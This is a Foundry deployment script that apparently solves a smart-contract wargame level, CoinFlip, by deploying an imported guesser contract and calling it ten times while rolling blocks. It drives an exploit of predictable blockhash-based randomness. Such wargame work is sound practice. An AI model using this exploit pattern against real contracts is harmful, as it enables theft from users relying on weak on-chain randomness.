// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.4.22 <0.9.0;
import "../src/Solutions/CoinFlipGuesser.sol";
import "../lib/forge-std/src/Script.sol";
import "../lib/forge-std/src/console.sol";

contract CoinFlipper is Script {
    // Pass the CoinFlip instance address on the command line:
    // forge script script/CoinFlipper.s.sol --sig "run(address)" <INSTANCE> ...
    function run(address instance) public {
        uint256 start = block.number;

        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        CoinFlipGuesser coinFlipGuesser = new CoinFlipGuesser(instance);
        for (uint256 i = 0; i < 10; i++) {
            coinFlipGuesser.flipGuesser();
            vm.roll(start + i + 1);
            vm.setBlockhash(
                block.number - 1,
                keccak256(abi.encode(block.number))
            );
        }
        vm.stopBroadcast();
    }
}
